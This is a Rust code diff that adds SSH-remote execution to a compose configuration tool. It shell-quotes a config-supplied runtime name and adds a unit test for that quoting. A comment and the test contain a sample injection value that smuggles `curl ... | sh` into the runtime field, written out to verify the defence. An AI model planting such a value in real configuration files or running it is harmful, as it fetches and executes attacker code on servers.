@@ -26,6 +26,7 @@ use std::process::Command;
 
 use crate::caddy::WS_NET;
 use crate::config::{HttpDecl, ServiceConfig};
+use crate::remote::{self, Site};
 
 /// Compose files `compose config` discovers, in the order it prefers them. Used
 /// only to *infer* whether a repo is a container repo when `kind` is unset;
@@ -86,12 +87,13 @@ pub fn project_name(branch_sanitized: &str, repo: &str) -> String {
     if s.is_empty() { "ws".to_string() } else { s }
 }
 
-/// Generate the per-worktree compose override at `path` from the current
-/// allocation, or remove a now-stale one. Returns `true` when a file was
+/// Generate the per-worktree compose override at `path` (on `site`) from the
+/// current allocation, or remove a now-stale one. Returns `true` when a file was
 /// written (so the caller adds it to `COMPOSE_FILE`), `false` when there was
-/// nothing to override.
+/// nothing to override. For a remote stack the file is streamed to the server.
 pub fn write_override(
-    path: &Path,
+    site: &Site,
+    path: &str,
     services: &BTreeMap<String, ServiceConfig>,
     port_map: &BTreeMap<String, u16>,
     env: &[(String, String)],
@@ -99,17 +101,13 @@ pub fn write_override(
 ) -> Result<bool> {
     match render_override(services, port_map, env, join_ws_net) {
         Some(content) => {
-            if let Some(parent) = path.parent() {
-                std::fs::create_dir_all(parent).ok();
-            }
-            std::fs::write(path, content)
-                .with_context(|| format!("write {}", path.display()))?;
+            site.write_file(path, &content)?;
             Ok(true)
         }
         None => {
             // Drop an override left by a prior `up` that no longer applies, so a
             // later read-only phase can't reference a stale file.
-            let _ = std::fs::remove_file(path);
+            site.remove_file(path);
             Ok(false)
         }
     }
@@ -268,26 +266,37 @@ fn yaml_dquote(v: &str) -> String {
 }
 
 /// Derive services from `<runtime> compose config --format json` run in
-/// `worktree`. Errors if the runtime is missing, there's no compose file, or the
-/// output doesn't parse — callers fall back to the declared `services`.
-pub fn derive(runtime: &str, worktree: &Path) -> Result<BTreeMap<String, ServiceConfig>> {
-    parse(&compose_config_json(runtime, worktree, false)?)
+/// `worktree` at `site` (the server, for a remote stack). Errors if the runtime
+/// is missing, there's no compose file, or the output doesn't parse — callers
+/// fall back to the declared `services`. `worktree` is the path *at the site*
+/// (the local worktree, or the server-side synced dir).
+pub fn derive(site: &Site, runtime: &str, worktree: &str) -> Result<BTreeMap<String, ServiceConfig>> {
+    parse(&compose_config_json(site, runtime, worktree, false)?)
 }
 
-/// Run `<runtime> compose config --format json` in `worktree` and return its
-/// stdout. `clean_env` strips `ws`'s injected `COMPOSE_PROJECT_NAME`/`COMPOSE_FILE`
-/// so the output reflects the *committed* project (the linter needs that; the
-/// derive path wants the ambient env). The single owner of the invocation both
-/// callers share.
-fn compose_config_json(runtime: &str, worktree: &Path, clean_env: bool) -> Result<String> {
-    let mut cmd = Command::new(runtime);
-    cmd.args(["compose", "config", "--format", "json"]).current_dir(worktree);
-    if clean_env {
-        cmd.env_remove("COMPOSE_PROJECT_NAME").env_remove("COMPOSE_FILE");
-    }
-    let out = cmd
-        .output()
-        .with_context(|| format!("spawn `{runtime} compose config`"))?;
+/// Run `<runtime> compose config --format json` in `worktree` at `site` and
+/// return its stdout. Locally, `clean_env` strips `ws`'s injected
+/// `COMPOSE_PROJECT_NAME`/`COMPOSE_FILE` so the output reflects the *committed*
+/// project (the linter needs that; the derive path wants the ambient env).
+/// Remotely, the server shell has none of those injected vars anyway, so its view
+/// is always the committed one. The single owner of the invocation both callers
+/// share.
+fn compose_config_json(site: &Site, runtime: &str, worktree: &str, clean_env: bool) -> Result<String> {
+    let out = match site {
+        Site::Local => {
+            let mut cmd = Command::new(runtime);
+            cmd.args(["compose", "config", "--format", "json"]).current_dir(worktree);
+            if clean_env {
+                cmd.env_remove("COMPOSE_PROJECT_NAME").env_remove("COMPOSE_FILE");
+            }
+            cmd.output()
+                .with_context(|| format!("spawn `{runtime} compose config`"))?
+        }
+        Site::Remote { .. } => site
+            .shell(&remote_compose_script(worktree, runtime))
+            .output()
+            .with_context(|| format!("ssh `{runtime} compose config`"))?,
+    };
     if !out.status.success() {
         anyhow::bail!(
             "`{runtime} compose config` failed: {}",
@@ -295,6 +304,20 @@ fn compose_config_json(runtime: &str, worktree: &Path, clean_env: bool) -> Resul
         );
     }
     Ok(String::from_utf8_lossy(&out.stdout).into_owned())
+}
+
+/// The server-side `compose config` command, a raw shell string run over SSH.
+/// BOTH the worktree and the runtime are shell-quoted: `runtime` is a `.ws.json`
+/// field (not gitignored, so a cloned repo can carry a hostile value like
+/// `podman; curl evil | sh #`), and this runs in the server's shell. Quoting
+/// keeps parity with the local `Command::new(runtime)` — an exact program name,
+/// no shell — so a bad value fails as "command not found" instead of injecting.
+fn remote_compose_script(worktree: &str, runtime: &str) -> String {
+    format!(
+        "cd {} && {} compose config --format json",
+        remote::shell_quote(worktree),
+        remote::shell_quote(runtime)
+    )
 }
 
 #[derive(Deserialize)]
@@ -411,9 +434,13 @@ pub fn lint(runtime: &str, worktree: &Path) -> Vec<String> {
     if !has_compose_file(worktree) {
         return Vec::new();
     }
-    // Best-effort (see `compose_config_json`): a missing runtime or an
-    // unparseable project yields no findings — the lint never blocks a caller.
-    let Ok(json) = compose_config_json(runtime, worktree, true) else { return Vec::new() };
+    // The isolation lint is a host-side static check over the (synced) committed
+    // files; it always runs locally (on a host without a runtime it simply yields
+    // nothing — see `compose_config_json`, best-effort, never blocks a caller).
+    let Ok(json) = compose_config_json(&Site::Local, runtime, &worktree.to_string_lossy(), true)
+    else {
+        return Vec::new();
+    };
     match serde_json::from_str::<LintDoc>(&json) {
         Ok(doc) => lint_findings(&doc),
         Err(_) => Vec::new(),
@@ -497,6 +524,20 @@ mod tests {
 
         // `app` publishes nothing (expose-only) → not derived.
         assert!(!s.contains_key("app"));
+    }
+
+    #[test]
+    fn remote_compose_script_quotes_a_hostile_runtime() {
+        // A `.ws.json` `runtime` carried in a cloned repo must not inject into the
+        // server-side shell: the payload lands inside a single-quoted word.
+        let s = remote_compose_script("/srv/ws/feat/api", "podman; curl http://evil | sh #");
+        assert!(s.contains("'podman; curl http://evil | sh #'"), "runtime not quoted: {s}");
+        assert!(s.starts_with("cd /srv/ws/feat/api && "), "{s}");
+        // A benign runtime stays bare (parity with the local `Command::new`).
+        assert_eq!(
+            remote_compose_script("/w", "podman"),
+            "cd /w && podman compose config --format json"
+        );
     }
 
     #[test]
